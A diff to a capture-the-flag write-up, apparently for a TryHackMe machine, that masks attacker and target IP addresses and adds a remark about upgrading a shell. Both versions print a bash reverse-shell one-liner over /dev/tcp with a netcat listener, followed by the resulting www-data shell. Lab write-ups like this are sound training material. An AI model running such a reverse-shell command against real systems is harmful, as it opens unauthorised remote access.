@@ -26,7 +26,7 @@ PORT      STATE SERVICE VERSION
 | ftp-syst: 
 |   STAT: 
 | FTP server status:
-|      Connected to ::ffff:192.168.150.103
+|      Connected to ::ffff:192.x.x.x
 |      Logged in as ftp
 |      TYPE: ASCII
 |      No session bandwidth limit
@@ -184,14 +184,14 @@ nc -lnvp 9002
 ```
 as well as 
 ``` bash
-echo 'bash -c "bash -i >/dev/tcp/192.168.150.103/9002 0>&1 2>&1"' | nc -lnvp 9001
+echo 'bash -c "bash -i >/dev/tcp/192.x.x.x/9002 0>&1 2>&1"' | nc -lnvp 9001
 ```
 AND 
 ``` bash
 ┌──(kali㉿kali)-[~/Documents/thm]
 └─$ nc -lnvp 9002
 listening on [any] 9002 ...
-connect to [192.168.150.103] from (UNKNOWN) [10.67.134.170] 38720
+connect to [192.x.x.x] from (UNKNOWN) [10.x.x.x] 38720
 bash: cannot set terminal process group (952): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@ide:/var/www/html/codiad/components/filemanager$ whoami
@@ -265,7 +265,8 @@ cat user.txt
 drac@ide:~$ 
 
 ```
-We had to upgrade to a terminal, but we got our first flag!
+We had to upgrade our shell, but we got our first flag!
+If you are wondering about why we had to upgrade the shell, I wrote a little about it in my first post, I would reccomend doing some research on why we do this as its something I requently find myself doing in CTFs.
 
 ## Privilege Escalation
 
